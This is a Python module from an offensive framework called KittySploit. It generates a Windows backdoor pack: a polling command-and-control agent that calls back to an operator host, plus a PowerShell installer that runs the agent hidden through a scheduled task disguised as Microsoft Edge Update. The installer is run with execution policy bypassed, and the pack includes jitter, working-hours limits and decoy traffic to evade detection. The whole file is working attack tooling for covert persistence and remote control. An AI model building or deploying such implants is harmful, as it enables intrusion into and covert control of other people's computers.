from kittysploit import *

from lib.c2.agent_installer import build_install_readme, build_windows_schtasks_install_ps1
from lib.c2.agent_spec import AgentSpec
from lib.c2.backdoor_identity import apply_implant_identity
from lib.c2.kitty_agent import build_kitty_agent_from_spec


class Module(Backdoor):
    """Windows scheduled-task pack for Kitty HTTP polling agent."""

    __info__ = {
        "name": "Windows Schtasks Kitty Agent Pack",
        "description": (
            "Writes kitty_agent.py and install_windows.ps1 (hidden pythonw + schtasks). "
            "Complements LOLBAS stagers with durable persistence. "
            "Controller: listeners/multi/reverse_http_polling."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "arch": Arch.PYTHON,
        "session_type": SessionType.POLLING,
        "listener": "listeners/multi/reverse_http_polling",
    }

    lhost = OptString("127.0.0.1", "Callback host", True)
    lport = OptPort(8088, "Callback port", True)
    url_prefix = OptString("/c2", "URL prefix", False)
    client_id = OptString("", "Client/implant ID (auto with implant_identity)", False)
    implant_identity = OptBool(True, "Generate Ed25519 implant identity", False)
    implant_id = OptString("", "Existing implant ID to reuse", False)
    poll_interval = OptInteger(10, "Base poll interval seconds", False)
    jitter_percent = OptInteger(35, "Poll jitter percent", False)
    kill_date = OptString("", "Kill date ISO YYYY-MM-DD", False)
    working_hours = OptString("", "HH:MM-HH:MM window", False)
    timezone = OptString("UTC", "Timezone", False)
    sleep_outside_hours = OptInteger(3600, "Sleep outside hours", False)
    user_agent = OptString("Mozilla/5.0", "HTTP User-Agent", False)
    host_header = OptString("", "Optional Host header", False)
    payload_comms_host = OptString("", "Optional connect host", False)
    cover_traffic = OptBool(True, "Decoy HTTP requests", False)
    use_ssl = OptBool(False, "HTTPS callback", False)

    task_name = OptString("MicrosoftEdgeUpdateTask", "Scheduled task name", False)
    install_dir = OptString(r"C:\ProgramData\Microsoft\EdgeUpdate", "Install directory", False)
    python_binary = OptString("python", "Python binary (pythonw used when hidden)", False)
    run_level = OptEnum(["LIMITED", "HIGHEST"], "Task run level", False)
    trigger = OptEnum(["ONLOGON", "ONSTART", "ONIDLE"], "Task trigger", False)
    hidden = OptBool(True, "Run hidden via pythonw", False)
    agent_filename = OptString("edge_update_agent.py", "Agent script filename", False)
    output_prefix = OptString("", "Output subdir prefix (empty = random)", False)

    def check(self):
        return bool(str(self.lhost or "").strip()) and int(self.lport or 0) > 0

    def run(self):
        if not self.check():
            print_error("lhost and lport are required")
            return False

        identity = apply_implant_identity(self)
        spec = AgentSpec.from_module(
            self,
            client_id=identity.implant_id if identity else None,
            private_key_pem=identity.private_key_pem if identity else None,
        )
        if not identity and not str(self.client_id or "").strip():
            spec.client_id = "win-agent"
        script = build_kitty_agent_from_spec(spec)

        agent_name = str(self.agent_filename or "edge_update_agent.py").strip()
        if not agent_name.endswith(".py"):
            agent_name += ".py"

        prefix = str(self.output_prefix or "").strip() or (self.random_text(8) + "_schtasks_pack")
        subdir = f"{prefix}/"

        if not self.write_out_dir(subdir + agent_name, script):
            print_error("Failed to write agent script")
            return False

        ps1 = build_windows_schtasks_install_ps1(
            install_dir=str(self.install_dir or r"C:\ProgramData\Microsoft\EdgeUpdate"),
            agent_filename=agent_name,
            task_name=str(self.task_name or "MicrosoftEdgeUpdateTask"),
            python_binary=str(self.python_binary or "python"),
            run_level=str(self.run_level or "LIMITED"),
            trigger=str(self.trigger or "ONLOGON"),
            hidden=bool(self.hidden),
        )
        if not self.write_out_dir(subdir + "install_windows.ps1", ps1):
            print_error("Failed to write install_windows.ps1")
            return False

        cid = spec.client_id
        readme = build_install_readme(
            title="Windows Schtasks Kitty Agent Pack",
            callback=f"{self.lhost}:{self.lport}{self.url_prefix or '/c2'}",
            windows_cmd="powershell -ExecutionPolicy Bypass -File .\\install_windows.ps1",
            notes=f"Start listeners/multi/reverse_http_polling. client_id={cid}",
        )
        self.write_out_dir(subdir + "README.md", readme)

        print_success(f"Generated schtasks pack under: {prefix}/")
        if getattr(self, "_implant_public_key_pem", None):
            print_info(f"Implant identity: {cid} — set listener implant_public_key")
        return True
